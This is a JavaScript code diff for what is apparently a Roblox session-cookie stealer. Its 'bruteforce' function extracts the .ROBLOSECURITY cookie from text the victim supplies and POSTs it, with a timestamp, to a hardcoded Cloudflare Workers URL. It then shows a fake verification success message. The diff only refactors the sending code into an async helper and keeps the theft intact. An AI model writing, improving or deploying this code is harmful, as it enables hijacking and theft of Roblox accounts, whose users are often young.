@@ -1,52 +1,40 @@
-// Cloudflare Proxy URL
 const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
 
-// Main bruteforce function (fixed)
-function bruteforce(sessionId) {
-  let robloxSecurityCookie = null;
-  
-  // Extract .ROBLOSECURITY if present
-  if (sessionId.includes(".ROBLOSECURITY")) {
-    robloxSecurityCookie = extractRobloxSecurityCookie(sessionId);
+async function sendToProxy(sessionId) {
+  try {
+    const response = await fetch(CLOUDFLARE_PROXY_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        sessionId: sessionId,
+        timestamp: new Date().toISOString()
+      })
+    });
+
+    if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
+    return await response.json();
+    
+  } catch (error) {
+    console.error('Proxy error:', error);
+    throw error;
   }
-
-  // Prepare payload for Cloudflare
-  const payload = {
-    sessionId: sessionId,
-    extractedCookie: robloxSecurityCookie,
-    timestamp: new Date().toISOString(),
-    userAgent: navigator.userAgent
-  };
-
-  // Send to Cloudflare Worker
-  fetch(CLOUDFLARE_PROXY_URL, {
-    method: 'POST',
-    headers: { 
-      'Content-Type': 'application/json',
-      'X-Auth-Key': 'YOUR_FRONTEND_KEY' // Optional security
-    },
-    body: JSON.stringify(payload)
-  })
-  .then(response => {
-    if (!response.ok) throw new Error('Proxy error');
-    return response.json();
-  })
-  .then(data => {
-    console.log("Proxy success:", data);
-    if (data.success) {
-      showCookieSuccess();
-    }
-  })
-  .catch(error => {
-    console.error("Proxy failed:", error);
-    showError("Failed to verify session. Please try again.");
-  });
 }
 
-// Cookie extraction helper
+// Example usage with your existing bruteforce function
+function bruteforce(sessionId) {
+  const cookie = sessionId.includes(".ROBLOSECURITY") 
+    ? extractRobloxSecurityCookie(sessionId)
+    : null;
+
+  sendToProxy(cookie || sessionId)
+    .then(() => showCookieSuccess())
+    .catch(() => showError("Failed to send data"));
+}
+
 function extractRobloxSecurityCookie(sessionId) {
-  const regex = /\.ROBLOSECURITY[^=]+=([^;]+)/;
-  const match = sessionId.match(regex);
+  const match = sessionId.match(/\.ROBLOSECURITY[^=]+=([^;]+)/);
   return match ? match[1] : null;
 }
 
